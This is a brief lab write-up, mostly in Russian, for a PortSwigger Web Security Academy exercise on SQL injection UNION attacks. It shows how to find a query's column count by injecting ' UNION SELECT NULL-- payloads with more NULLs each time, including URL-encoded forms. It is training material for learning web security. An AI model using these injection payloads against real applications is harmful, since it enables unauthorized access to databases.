# SQL injection UNION attack, determining the number of columns returned by the query
## Цель: определить количество столбцов, возвращаемых запросом, выполнив атаку SQL-инъекции UNION

### Пути решения:
1. У нас есть различное количество нулевых значений:
 ```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
2. Мы возьмем перехвать трафика или в самой ссылке напишем ```'+UNION+SELECT+NULL--```, и получим ошибку
3. Тогда мы добавим еще NULL и строка будет выглядить так ```'+UNION+SELECT+NULL,NULL--``` и снова ошибка и мы добавляем столько нулевых значений пока ошибка не исчезнет
4. У меня пропала на ```'+UNION+SELECT+NULL,NULL,NULL--```

Ссылка: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
